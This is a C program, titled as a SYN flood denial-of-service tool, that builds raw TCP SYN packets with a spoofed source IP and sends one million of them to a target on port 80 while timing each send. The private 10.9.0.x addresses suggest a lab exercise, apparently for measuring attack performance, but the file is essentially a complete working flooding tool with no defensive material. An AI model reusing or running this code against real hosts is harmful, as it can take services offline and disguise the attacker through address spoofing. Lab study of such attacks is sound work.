/*
    Syn Flood DOS with LINUX sockets
*/
#include <stdio.h>
#include <sys/time.h> // gettimeofday()
#include <string.h>   //memset
#include <sys/socket.h>
#include <stdlib.h>      //for exit(0);
#include <errno.h>       //For errno - the error number
#include <netinet/tcp.h> //Provides declarations for tcp header
#include <netinet/ip.h>  //Provides declarations for ip header

#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>

#define NUM_SYN_REQ 1000000

struct pseudo_header // needed for checksum calculation
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;

    struct tcphdr tcp;
};

unsigned short csum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

int main(void)
{
    // Create a raw socket
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    // Datagram to represent the packet
    char datagram[4096], source_ip[32];
    // IP header
    struct iphdr *iph = (struct iphdr *)datagram;
    // TCP header
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    strcpy(source_ip, "10.9.0.3");

    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr("10.9.0.5");

    memset(datagram, 0, 4096); /* zero out the buffer */

    // Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->id = htons(54321); // Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;                    // Set to 0 before calculating checksum
    iph->saddr = inet_addr(source_ip); // Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);

    // TCP Header
    tcph->source = htons(1234);
    tcph->dest = htons(80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5; /* first and only tcp segment */
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840); /* maximum allowed window size */
    tcph->check = 0;            /* if you set a checksum to zero, your kernel's IP stack
                            should fill in the correct checksum during transmission */
    tcph->urg_ptr = 0;
    // Now the IP checksum

    psh.source_address = inet_addr(source_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

    tcph->check = csum((unsigned short *)&psh, sizeof(struct pseudo_header));

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        printf("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n", errno, strerror(errno));
        exit(0);
    }
    FILE *file = fopen("syns_results_c.txt", "w");
    if (file == NULL)
    {
        perror("Fopen() failed\n");
        return 1;
    }
    struct timeval start_send, end_send;
    int attackTime = 0;

    // Send 1000000 syn requests
    for (int i = 1; i < NUM_SYN_REQ + 1; i++)
    {
        gettimeofday(&start_send, 0); // Start time of sending
        // Send the packet
        if (sendto(s,                       /* our socket */
                   datagram,                /* the buffer containing headers and data */
                   iph->tot_len,            /* total length of our datagram */
                   0,                       /* routing flags, normally always 0 */
                   (struct sockaddr *)&sin, /* socket addr, just like in */
                   sizeof(sin)) < 0)        /* a normal send() */
        {
            printf("error\n");
        }
        // Data send successfully
        else
        {
            gettimeofday(&end_send, 0); // End time of sending
            float time_elapsed = (end_send.tv_sec - start_send.tv_sec) + (end_send.tv_usec - start_send.tv_usec) / 1000000.0;
            fprintf(file, "%d %.6f\n", i, time_elapsed);
            attackTime += time_elapsed * 1000000; // Calculate the all time in microseconds
            printf("Packet Send \n");
        }
    }

    float total_time = attackTime / 1000000.0;
    float average_time_per_packet = (float)attackTime / NUM_SYN_REQ / 1000000.0;

    fprintf(file, "Attack time: %.10f minutes\n", total_time / 60.0);
    fprintf(file, "Average time for sending packet: %.10f seconds\n", average_time_per_packet);

    fclose(file);

    // close(s);

    return 0;
}